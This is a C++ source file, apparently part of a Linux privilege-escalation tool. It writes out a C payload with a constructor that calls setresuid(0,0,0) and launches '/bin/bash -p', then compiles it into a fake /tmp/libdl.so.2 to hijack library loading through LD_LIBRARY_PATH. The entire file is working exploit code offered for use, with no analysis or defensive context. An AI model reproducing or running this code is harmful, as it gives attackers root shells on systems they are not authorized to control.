#include <iostream>
#include <fstream>
#include <unistd.h>
void LD_LIBRARY_PATH_SHELL(void)
{
	std::string LD_LIBRARY_PATH_C = 
		"#include <stdio.h>\n"
		"#include <sys/types.h>\n"
		"#include <stdlib.h>\n"

        "static void hijack() __attribute__((constructor)); \n"
        
        "void hijack(){ \n"

 		 "	unsetenv(\"LD_LIBRARY_PATH\");\n"
 		 "	setresuid(0,0,0);\n"
 		 "	system(\"/bin/bash -p\");\n"

		"}\n";

	putchar('\n');
	std::cout << "--------------------------------------" << std::endl;

	putchar('\n');
    std::cout << "     ~  LD_LIBRARY_PATH  ~ " << std::endl;
    putchar('\n');
	std::cout << "[+] ARE YOU SURE YOU WANT TO CONTINUE? [Y/N]: ";
	std::string answer;
	std::cin >> answer;
	if (answer == "Y" or answer == "y")
	{
		std::cout << "\n[+] SAVING PAYLOAD" << std::endl;
		std::ofstream outf{"/tmp/library_path.c"};
		if (!outf)
		{
			std::cerr << "[!] ERROR WRITING PAYLOAD TO FILE\n" << std::endl;
			exit(EXIT_FAILURE);
		}
		else 
		{
			outf << LD_LIBRARY_PATH_C;
			try	
			{
				std::system("gcc -fPIC -shared -nostartfiles -o /tmp/libdl.so.2 /tmp/library_path.c");
				std::cout << "[+] Successfully Created LD_LIBRARY_PATH Shared Object Library Shell to /tmp/libdl.so.2" << std::endl;
					

			}
			
			catch (int a)
			{
				std::cerr << "[!] ERROR COMPILING C PAYLOAD VIA GCC" << a << std::endl;
			}

		}
	}
	else
	{
		exit(EXIT_FAILURE);
	}

	
}
